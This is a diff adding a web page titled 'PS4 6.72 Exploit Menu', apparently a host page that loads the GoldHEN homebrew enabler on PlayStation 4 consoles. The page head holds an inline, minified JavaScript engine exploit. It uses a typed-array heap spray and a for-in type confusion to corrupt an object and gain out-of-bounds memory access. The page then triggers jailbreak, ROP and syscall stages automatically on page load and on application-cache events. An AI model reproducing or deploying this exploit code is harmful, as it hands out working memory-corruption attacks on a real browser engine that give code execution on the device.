@@ -1,0 +1,161 @@
+<html manifest="offlinexmb.cache">
+<head>
+<meta charset="UTF-8" />
+<title>PS4 6.72 Exploit Menu</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+    body {
+        background-color: #121212;
+        color: #e0e0e0;
+        font-family: Helvetica, Arial, sans-serif;
+        text-align: center;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        margin: 0;
+        background-image: linear-gradient(to bottom, #0a0a0a, #1a1a1a);
+    }
+    .loader-container {
+        text-align: center;
+    }
+    h1 {
+        color: #4cc9f0;
+        text-shadow: 0 0 10px rgba(76, 201, 240, 0.7);
+        margin-bottom: 20px;
+    }
+    .progress-bar {
+        width: 300px;
+        height: 25px;
+        border: 2px solid #4cc9f0;
+        border-radius: 8px;
+        overflow: hidden;
+        margin: 0 auto;
+        box-shadow: 0 0 10px rgba(76, 201, 240, 0.3);
+    }
+    .progress {
+        height: 100%;
+        width: 0%;
+        background: linear-gradient(90deg, #4cc9f0, #2a7ea8);
+        animation: loadAnim 3s linear forwards;
+    }
+    @keyframes loadAnim {
+        from { width: 0%; }
+        to { width: 100%; }
+    }
+    .status {
+        margin-top: 15px;
+        font-size: 18px;
+        color: #e0e0e0;
+    }
+  .loader {
+
+    width: 200px;
+    height: 200px;
+    animation: fadeOut 1s ease forwards;
+    animation-delay: 4s;
+  }
+
+  .loader img {
+    width: 100%;
+    height: auto;
+    display: block;
+    animation: glitter 1s infinite linear;
+  }
+
+  /* Glitzer-Effekt */
+  @keyframes glitter {
+    0%   { filter: brightness(1) drop-shadow(0 0 5px gold); }
+    25%  { filter: brightness(1.4) drop-shadow(0 0 15px yellow); }
+    50%  { filter: brightness(1) drop-shadow(0 0 5px gold); }
+    75%  { filter: brightness(1.4) drop-shadow(0 0 20px orange); }
+    100% { filter: brightness(1) drop-shadow(0 0 5px gold); }
+  }
+
+  /* Nach 3 Sekunden langsam ausblenden */
+  @keyframes fadeOut {
+    to { opacity: 0; visibility: hidden; }
+  }    
+</style>
+<script>
+var leaker_obj={a:0};var leaker_arr=new Uint32Array(6);var oob_slave=new Uint8Array(1024);var oob_master=new Uint32Array(7);var spray=[];function spray_one(){var x=new Uint32Array(1);x[spray.length+'spray']=123;spray.push(x);}for(var i=0;i<0x10000;i++)spray_one();var target={a:2.1100820415101592e-303,b:false,c:true,d:5678};var target2={a:2.1100820415101592e-303,b:false,c:true,e:5678};var impl_idx=0;function create_impl(){var ans={a:target};for(var i=0;i<32;i++)ans[(impl_idx++)+'x']={};return ans;}function trigger(x){if(impl.a!=target){print("wtf?");while(1);}var o={a:1};for(var i in o){{i=x;function i(){};}o[i];}if(impl.a!=target){print("corrupted!");print(typeof(impl.a));print(impl.a.length);target.c=leaker_obj;leaker_obj.a=leaker_obj;var l1=impl.a[4];var l2=impl.a[5];leaker_obj.a=oob_slave;var s1=impl.a[4];var s2=impl.a[5];target.c=leaker_arr;impl.a[4]=l1;impl.a[5]=l2;target.c=oob_master;impl.a[4]=s1;impl.a[5]=s2;impl.a=target;print([l1,l2,s1,s2]);throw"exploit fucking finished";}}try{for(var _=0;_<1024;_++){var impl=create_impl();var s={a:impl};trigger(s);}}catch(e){print("error: "+e);}
+
+window.applicationCache.ondownloading = function() {  };
+window.applicationCache.onprogress = function(a) {  };
+window.applicationCache.oncached = function() {  };
+window.applicationCache.onnoupdate = function() {
+    jailbreak();
+    p.write8(0, 0);
+};
+window.applicationCache.onerror = function() {
+    jailbreak();
+    p.write8(0, 0);
+};
+
+</script>
+
+</head>
+<body>
+    <div class="loader">
+        <img src="hen.png" alt="GoldHen Logo">
+    </div>
+    <script>
+  setTimeout(() => {
+    document.body.innerHTML = "<h1 style='color:gold; text-align:center;'>GoldHEN Loaded!</h1>";
+  }, 4000);
+</script>
+<div class="container">
+    <div class="header">
+        <h1></h1>
+    </div>
+    <br>
+    <div class="status-message">
+        <h1 id="progress"></h1>
+    </div>
+    <div class="status" id="status"></div>
+
+    
+    <div class="footer">
+      
+    </div>
+</div>
+
+<script>
+function gold1() {
+progress.innerHTML="<div>Loading GoldHEN...</div>";
+start_exploit();
+start_exploit();
+try {
+	  stagegold1();
+	} catch (e) {
+		alert(e);
+	}
+}    
+
+function awaitpl() {
+    document.getElementById("mexp").style.display = "none";
+}
+
+</script>
+
+<script src="./rop.js"></script>
+<script src="./syscalls.js"></script>
+<script src="./expl.js"></script>
+<script src="./exploit.js"></script>
+<script>
+window.addEventListener('load', function() {
+
+  setTimeout(function() {
+
+    if (typeof gold1 === 'function') {
+      gold1();
+    }
+  }, 2500);
+});
+
+</script>
+<script src="./goldhen1.js"></script> 
+<script src="./jb.js"></script>
+<pre id="console"></pre>
+</body>
+</html>
